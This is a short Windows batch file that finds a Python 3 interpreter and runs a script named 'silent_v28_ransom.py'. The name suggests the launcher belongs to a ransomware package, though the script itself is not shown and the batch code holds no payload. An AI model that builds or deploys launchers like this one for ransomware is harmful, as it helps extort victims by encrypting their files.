@echo off
setlocal
cd /d "%~dp0"
where py >nul 2>nul
if %errorlevel%==0 (
  py -3 silent_v28_ransom.py
  goto :end
)
where python >nul 2>nul
if %errorlevel%==0 (
  python silent_v28_ransom.py
  goto :end
)
echo Python 3 was not found. Install Python 3 from python.org and try again.
pause
:end
if not "%errorlevel%"=="0" pause
